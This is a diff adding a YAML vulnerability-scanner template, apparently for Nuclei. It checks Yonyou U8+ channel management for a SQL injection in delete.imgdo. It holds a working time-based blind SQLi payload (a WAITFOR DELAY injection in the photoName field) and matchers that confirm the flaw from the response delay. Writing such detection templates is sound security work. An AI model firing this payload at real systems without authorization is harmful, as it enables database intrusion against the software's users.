@@ -1,0 +1,37 @@
+id: yonyou-u8-plus-delete-imgdo-sqli
+info:
+  name: 用友U8+渠道管理(高级版) check.imgdo、delete.imgdo SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 用友U8+是用友网络科技股份有限公司推出的企业管理综合平台，广泛应用于财务、进销存、人力资源等企业核心业务系统中。在U8+渠道管理（高级版）模块中，check.imgdo和 delete.imgdo 接口存在SQL注入漏洞。该漏洞是由于页面在处理用户输入的参数时，未对输入内容进行充分过滤与安全校验，攻击者可构造恶意SQL语句，通过HTTP请求注入至后端数据库查询中。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ssfcih2owkdkom9f
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,u8plus
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /business/test/delete.imgdo HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 43
+
+        _id=1&photoName=a%'waitfor delay'0:0:5'-- -
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
